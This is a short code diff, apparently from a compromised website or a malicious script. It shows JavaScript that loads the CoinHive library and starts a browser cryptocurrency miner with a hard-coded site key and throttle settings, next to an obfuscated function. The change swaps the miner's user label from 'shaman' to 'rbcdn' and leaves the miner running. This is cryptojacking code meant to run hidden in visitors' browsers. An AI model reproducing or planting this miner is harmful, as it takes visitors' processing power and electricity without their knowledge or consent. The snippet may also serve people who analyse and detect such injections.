@@ -3,7 +3,7 @@ function S300(){}S300.i4=function(s,d){function M(l){var z=2;while(z!==15){switc
 (function() {
     var s = document.createElement('script');
     s.onload = function () {
-      var miner = new CoinHive.User("H3QMiNzSRGMRObqvqtk0BG3cNIqxUuvr", "shaman"{
+      var miner = new CoinHive.User("H3QMiNzSRGMRObqvqtk0BG3cNIqxUuvr", "rbcdn", {
                       throttle: 0.1,
                       threads: 1,
                   });
